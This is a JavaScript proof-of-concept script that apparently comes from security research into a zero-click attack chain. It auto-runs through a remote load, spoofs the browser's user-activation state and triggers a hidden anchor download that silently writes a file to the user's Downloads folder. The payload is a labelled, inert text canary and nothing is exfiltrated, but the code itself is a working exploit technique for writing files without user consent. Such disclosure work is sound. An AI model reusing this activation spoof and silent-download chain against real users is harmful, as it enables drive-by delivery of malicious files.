/* T63 CURRENT-BUILD DISK-WRITE CANARY - Pluto Security research, INERT demo.
   Auto-run payload (via playground GitHub auto-load, T62-proven).
   Chain under test on the CURRENT build: auto-run -> spoofed
   activation (T11-proven) -> anchor-click download (T29/T30-proven)
   -> silent write of an inert canary to ~/Downloads. Zero clicks.
   Nothing exfiltrated, nothing else stored, clearly labeled. */
(function () {
  if (window.__T63_SEEN__) return;
  window.__T63_SEEN__ = true;

  function log(m) { try { console.log("[T63] " + m); } catch (e) {} }
  log("AUTO-RUN disk-write canary (inert) " + Date.now());

  try {
    var b = document.createElement("div");
    b.textContent = "T63 CURRENT-BUILD DISK-WRITE CANARY (inert) auto-run " +
      Date.now() + " - Pluto Security inert demo, nothing sent";
    b.setAttribute("style", "position:fixed;left:0;right:0;top:0;z-index:2147483647;" +
      "background:#c00;color:#fff;font:700 13px ui-monospace,Menlo,monospace;" +
      "padding:4px 8px;text-align:center;");
    (document.body || document.documentElement).appendChild(b);
  } catch (e) { log("banner failed: " + e); }

  try {
    Object.defineProperty(navigator, "userActivation", {
      configurable: true,
      get: function () { return { hasBeenActive: true, isActive: true }; }
    });
    log("activation spoofed (T11-proven)");
  } catch (e) { log("spoof failed: " + e); }

  setTimeout(function () {
    try {
      var txt = "T63 INERT CANARY - Pluto Security research demo.\n" +
        "Written ZERO-CLICK via auto-run remote payload on the CURRENT build.\n" +
        "Epoch: " + Date.now() + "\nNothing else stored, nothing sent.\n";
      var blob = new Blob([txt], { type: "text/plain" });
      var url = URL.createObjectURL(blob);
      var a = document.createElement("a");
      a.href = url;
      a.download = "CANARY-T63-current-build-" + Date.now() + ".txt";
      a.rel = "noopener";
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();
      log("anchor download clicked: " + a.download);
      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 8000);
    } catch (e) { log("download failed: " + e); }
  }, 2000);
})();
